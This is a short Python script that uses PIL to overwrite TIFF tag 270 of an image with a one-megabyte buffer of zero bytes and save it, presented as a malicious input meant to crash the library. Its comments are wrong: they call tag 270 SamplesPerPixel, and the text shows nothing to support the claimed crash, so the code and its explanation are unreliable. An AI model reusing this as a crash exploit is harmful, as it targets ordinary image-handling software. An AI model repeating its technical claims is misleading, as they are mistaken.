from PIL import Image

# Create an image object
img = Image.open("image.tif")

# Extract the tag data
tag_data = img.tag[270]  # 270 is the tag number for SAMPLESPERPIXEL

# Create a malicious tag data that will cause a crash
malicious_tag_data = b"\x00" * 0x100000  # Create a large buffer of zeros

# Replace the original tag data with the malicious data
img.tag[270] = malicious_tag_data

# Try to save the image, which will cause a crash
img.save("output.tif")